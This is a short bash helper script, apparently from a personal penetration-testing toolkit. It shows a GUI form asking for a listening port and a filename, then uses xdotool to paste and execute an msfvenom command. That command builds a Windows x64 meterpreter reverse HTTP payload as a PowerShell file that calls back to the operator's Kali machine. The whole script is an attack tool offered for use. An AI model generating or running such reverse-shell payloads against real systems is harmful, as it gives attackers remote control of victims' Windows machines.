#!/bin/bash

: '
Create PS1 file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "filename"

LPORT=${form_data["LPORT"]}
FILE=${form_data["filename"]}

paste_command "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${KALI_IP} LPORT=${LPORT} -f psh -o ${FILE}.ps1"
xdotool key Return